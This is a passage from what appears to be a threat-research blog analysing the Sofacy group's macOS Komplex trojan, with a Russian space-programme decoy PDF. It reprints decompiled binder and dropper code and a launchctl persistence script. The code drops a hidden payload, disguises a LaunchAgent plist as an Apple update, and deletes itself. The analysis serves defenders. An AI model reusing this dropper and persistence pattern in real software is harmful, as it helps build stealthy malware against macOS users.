class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-12">12</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-14">14</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-16">16</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-18">18</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-20">20</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-22">22</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-24">24</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">_main</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">arg0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">arg1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_28</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSAutoreleasePool </span><span class="crayon-v">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_38</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSSearchPathForDirectoriesInDomains</span><span class="crayon-sy">(</span><span class="crayon-cn">0xf</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">objectAtIndex</span><span class="crayon-o">:</span><span class="crayon-cn">0x0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_40</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-v">stringWithFormat</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"%@/roskosmos_2015-2025.pdf"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_48</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-v">stringWithFormat</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"SetFile -a E %@/roskosmos_2015-2025.pdf"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-6"><span class="crayon-v">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_50</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-v">stringWithFormat</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"rm -rf %@/roskosmos_2015-2025.app"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_58</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-v">stringWithFormat</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"open -a Preview.app %@/roskosmos_2015-</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-9"><span class="crayon-s">2025.pdf"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-v">dataWithBytes</span><span class="crayon-o">:</span><span class="crayon-e">_joiner </span><span class="crayon-v">length</span><span class="crayon-o">:</span><span class="crayon-cn">0x20f74</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">writeToFile</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/tmp/content"</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-11"><span class="crayon-v">atomically</span><span class="crayon-o">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">var_50 </span><span class="crayon-v">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"chmod 755 /tmp/content"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-v">dataWithBytes</span><span class="crayon-o">:</span><span class="crayon-e">_pdf </span><span class="crayon-v">length</span><span class="crayon-o">:</span><span class="crayon-cn">0x182c82</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">writeToFile</span><span class="crayon-o">:</span><span class="crayon-e">var_40 </span><span class="crayon-v">atomically</span><span class="crayon-o">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">var_48 </span><span class="crayon-v">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_70</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSTask </span><span class="crayon-v">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_70 </span><span class="crayon-v">setLaunchPath</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/tmp/content"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_70 </span><span class="crayon-v">launch</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_70 </span><span class="crayon-v">waitUntilExit</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-v">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-v">arg1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_28 </span><span class="crayon-v">release</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5536700342485-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5536700342485-24"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>1</em><em> Main function within the Komplex binder</em></p>
<p style="text-align: left;">The binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using the Preview application built into OS X. Figure 2 shows a portion of the 17 page decoy document. This document is titled “Проект Федеральной космической программы России на 2016 - 2025 годы” and describes the Russian Federal Space Program’s projects between 2016 and 2025. We do not have detailed targeting information regarding the  Sofacy group's attack campaign delivering Komplex at this time; however, based on the contents of the decoy document, we believe that the target is likely associated with the aerospace industry.</p>
<p style="text-align: left;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_1.png" rel="wpdevart_lightbox"><img class="size-large wp-image-19703 aligncenter" src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_1-500x391.png" alt="sofacy_1" width="500" height="391" /></a></p>
<p style="text-align: center;"><em>Figure </em><em>2</em><em> Decoy document opened by Komplex binder showing document regarding the Russian Space Program</em></p>
<h3>Komplex Dropper</h3>
<p>The Komplex dropper component is saved to the system as “/tmp/content” (SHA256: 96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3) and is responsible for installing a third executable to the system and setting up persistence for the third executable to launch each time the OS X operating system starts. This dropper also provided the basis for the name “Komplex”, which is seen in several folder paths that were included within the Mach-O file, such as “/Users/kazak/Desktop/Project/komplex".</p>
<p>The Komplex dropper is fairly straightforward from a functional perspective, as it contains all of its functionality within its “_main” function. The “_main” function (Figure 3) accesses data within three variables named ‘_Payload_1’, ‘_Payload_2’ and ‘_Payload_3’, and writes them to three files on the system.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a553d860495211" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int _main(int arg0, int arg1) {
    var_38 = [[NSAutoreleasePool alloc] init];
    var_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c];
    var_48 = [NSData dataWithBytes:_Payload_2 length:0x201];
    var_50 = [NSData dataWithBytes:_Payload_3 length:0x4c];
    system("mkdir -p /Users/Shared/.local/ &amp;&gt; /dev/null");
    system("mkdir -p ~/Library/LaunchAgents/ &amp;&gt; /dev/null");
    [var_40 writeToFile:@"/Users/Shared/.local/kextd" atomically:0x1];
    [var_48 writeToFile:@"/Users/Shared/com.apple.updates.plist" 
atomically:0x1];
    [var_50 writeToFile:@"/Users/Shared/start.sh" atomically:0x1];
    system("cp /Users/Shared/com.apple.updates.plist 
$HOME/Library/LaunchAgents/  &amp;&gt;/dev/null");
    remove("/Users/Shared/com.apple.updates.plist");
    system("chmod 755 /Users/Shared/.local/kextd");
    system("chmod 755 /Users/Shared/start.sh");
    var_58 = [[NSTask alloc] init];
    [var_58 setLaunchPath:@"/Users/Shared/start.sh"];
    [var_58 launch];
    [var_58 waitUntilExit];
    remove("/Users/Shared/start.sh");
    remove(*arg1);
    [var_38 release];
    return 0x0;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-6">6</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-8">8</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-10">10</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-12">12</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-14">14</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-16">16</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-18">18</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-20">20</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-22">22</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a553d860495211-24">24</div><div class="crayon-num" data-line="crayon-60a9b5c8a553d860495211-25">25</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">_main</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">arg0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">arg1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_38</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSAutoreleasePool </span><span class="crayon-v">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_40</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-v">dataWithBytes</span><span class="crayon-o">:</span><span class="crayon-e">_Payload_1 </span><span class="crayon-v">length</span><span class="crayon-o">:</span><span class="crayon-cn">0x15c1c</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_48</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-v">dataWithBytes</span><span class="crayon-o">:</span><span class="crayon-e">_Payload_2 </span><span class="crayon-v">length</span><span class="crayon-o">:</span><span class="crayon-cn">0x201</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_50</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-v">dataWithBytes</span><span class="crayon-o">:</span><span class="crayon-e">_Payload_3 </span><span class="crayon-v">length</span><span class="crayon-o">:</span><span class="crayon-cn">0x4c</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"mkdir -p /Users/Shared/.local/ &amp;&gt; /dev/null"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"mkdir -p ~/Library/LaunchAgents/ &amp;&gt; /dev/null"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_40 </span><span class="crayon-v">writeToFile</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/.local/kextd"</span><span class="crayon-h"> </span><span class="crayon-v">atomically</span><span class="crayon-o">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_48 </span><span class="crayon-v">writeToFile</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/com.apple.updates.plist"</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-10"><span class="crayon-v">atomically</span><span class="crayon-o">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_50 </span><span class="crayon-v">writeToFile</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/start.sh"</span><span class="crayon-h"> </span><span class="crayon-v">atomically</span><span class="crayon-o">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"cp /Users/Shared/com.apple.updates.plist </span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-13"><span class="crayon-s">$HOME/Library/LaunchAgents/&nbsp;&nbsp;&amp;&gt;/dev/null"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span><span class="crayon-s">"/Users/Shared/com.apple.updates.plist"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"chmod 755 /Users/Shared/.local/kextd"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"chmod 755 /Users/Shared/start.sh"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_58</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSTask </span><span class="crayon-v">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-v">setLaunchPath</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/start.sh"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-v">launch</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-v">waitUntilExit</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span><span class="crayon-s">"/Users/Shared/start.sh"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-v">arg1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_38 </span><span class="crayon-v">release</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a553d860495211-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a553d860495211-25"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>3</em><em> Komplex Dropper's main function that drops three files to the system and runs a shell script</em></p>
<p>The “_main” function writes the data within ‘_Payload_1’, ‘_Payload_2’, and ‘_Payload_3’ variables to the following files, respectively:</p>
<ol>
<li>/Users/Shared/.local/kextd (SHA256:<br />
227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5)</li>
<li>/Users/Shared/com.apple.updates.plist (SHA256:<br />
1f22e8f489abff004a3c47210a9642798e1c53efc9d6f333a1072af4b11d71ef)</li>
<li>/Users/Shared/start.sh (SHA256:<br />
d494e9f885ad2d6a2686424843142ddc680bb5485414023976b4d15e3b6be800)</li>
</ol>
<p>The shell script saved to ‘/Users/Shared/start.sh’ calls the system command ‘launchctl’ to add a plist entry into ‘launchd’ to automatically execute the Komplex payload each time the system starts. Figure 4 shows the contents of the ‘start.sh’ script that sets up persistence for the payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a5542861047962" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#!/bin/sh
launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
